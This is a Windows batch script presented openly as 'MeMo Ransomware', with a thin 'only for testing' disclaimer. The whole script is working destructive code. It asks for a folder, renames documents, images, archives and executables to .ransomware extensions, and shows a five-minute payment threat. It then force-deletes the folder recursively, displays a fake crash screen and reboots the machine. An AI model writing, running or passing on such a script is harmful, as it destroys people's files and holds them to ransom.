@echo off
title MeMo Ransomware
color 0C
echo This is only for testing, we will not be responsible for anything casused
echo I don't want to unleash it CLOSE THE TAB
echo I want to unleash it TYPE ANYTHING
color C0
Pause
echo Enter the Location you want to unleash the MeMo Ransomware
set /p location=
goto process
:process
cd %location% 
ren *.txt *.ransomware1
ren *.doc *.ransomware2
ren *.png *.ransomware3
ren *.jpeg *.ransomware4
ren *.gif *.ransomware5
ren *.pptx *.ransomware6
ren *.pdf *.ransomware7
ren *.jpg *.ransomware8
ren *.exe *.ransomware9
ren *.zip *.ransomware10
cls
Color A
@echo You have 5 minute to pay or else...
Color C
@echo Say bye bye to your files.
Color A
@echo Starts Now!
cls
Color C
Title 5 minutes to go!
echo 5 minutes to go!
ping localhost -n 60 >nul
echo 4 min
title 4 min
ping localhost -n 60 >nul
echo 3 min
title 4 min
ping localhost -n 60 >nul
echo 2 min
title 2 min
ping localhost -n 60 >nul
echo 1 min
title 1 min
ping localhost -n 60 >nul
echo 0 min
title 0 min
goto process
:process
cd %location%
del
ECHO Delete Folder: %Location%
SET FOLDER=%Location%
CD /
DEL /F/Q/S "%Location%" > NUL
RMDIR /Q/S "%Location%"
Color 17
@echo :(
@echo Your PC ran into a problem and the files you entered is deleted. We are restarting the PC for you.
@echo (0%)
ping localhost -n 10 >nul
cls
@echo :(
@echo Your PC ran into a problem and the files you entered is deleted. We are restarting the PC for you.
@echo (20%)
ping localhost -n 10 >nul
cls
@echo :(
@echo Your PC ran into a problem and the files you entered is deleted. We are restarting the PC for you.
@echo (40%)
ping localhost -n 10 >nul
cls
@echo :(
@echo Your PC ran into a problem and the files you entered is deleted. We are restarting the PC for you.
@echo (60%)
ping localhost -n 10 >nul
cls
@echo :(
@echo Your PC ran into a problem and the files you entered is deleted. We are restarting the PC for you.
@echo (80%)
ping localhost -n 10 >nul
cls
@echo :(
@echo Your PC ran into a problem and the files you entered is deleted. We are restarting the PC for you.
@echo (99%)
ping localhost -n 5 >nul
cls
@echo :(
@echo Your PC ran into a problem and the files you entered is deleted. We are restarting the PC for you.
@echo (100%)
ping localhost -n 3 >nul
shutdown /r /c "MeMo Ransomware"